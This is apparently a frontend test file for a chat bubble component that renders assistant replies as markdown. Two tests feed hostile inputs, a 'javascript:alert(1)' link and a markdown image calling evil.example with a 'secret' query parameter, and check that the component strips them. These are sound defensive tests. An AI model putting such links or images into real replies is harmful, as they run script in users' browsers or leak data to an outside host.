import { render, screen } from "@testing-library/react";
import { Bubble } from "../src/components/chat/Message";

test("an assistant reply renders markdown", () => {
  render(<Bubble role="assistant">{"Take **two** easy days:\n\n- Mon swim\n- Tue rest"}</Bubble>);
  expect(screen.getByText("two").tagName).toBe("STRONG");
  expect(screen.getAllByRole("listitem")).toHaveLength(2);
});

test("a user message stays literal", () => {
  render(<Bubble role="user">{"**not bold**"}</Bubble>);
  expect(screen.getByText("**not bold**")).toBeInTheDocument();
});

test("links open in a new tab", () => {
  render(<Bubble role="assistant">{"[guide](https://example.com)"}</Bubble>);
  const a = screen.getByRole("link", { name: "guide" });
  expect(a).toHaveAttribute("target", "_blank");
  expect(a).toHaveAttribute("rel", "noreferrer");
});

test("unsafe links lose their href", () => {
  render(<Bubble role="assistant">{"[x](javascript:alert(1))"}</Bubble>);
  expect(screen.getByText("x").getAttribute("href") ?? "").not.toMatch(/javascript/i);
});

test("a half-streamed reply renders", () => {
  render(<Bubble role="assistant">{"CTL is **up"}</Bubble>);
  expect(screen.getByText(/CTL is \*\*up/)).toBeInTheDocument();
});

test("headings never out-shout the page", () => {
  render(<Bubble role="assistant">{"# Week plan"}</Bubble>);
  expect(screen.queryByRole("heading")).not.toBeInTheDocument();
  expect(screen.getByText("Week plan")).toHaveClass("font-semibold");
});

test("markdown images never render, so a reply cannot make the browser fetch a URL", () => {
  const { container } = render(<Bubble role="assistant">{"see ![chart](https://evil.example/x.png?d=secret)"}</Bubble>);
  expect(container.querySelector("img")).toBeNull();
});

test("single newlines survive in a paragraph (prose.css shows them; jsdom does not load it)", () => {
  const { container } = render(<Bubble role="assistant">{"Mon: swim\nTue: rest"}</Bubble>);
  expect(container.querySelector("p")!.textContent).toContain("\n");
});
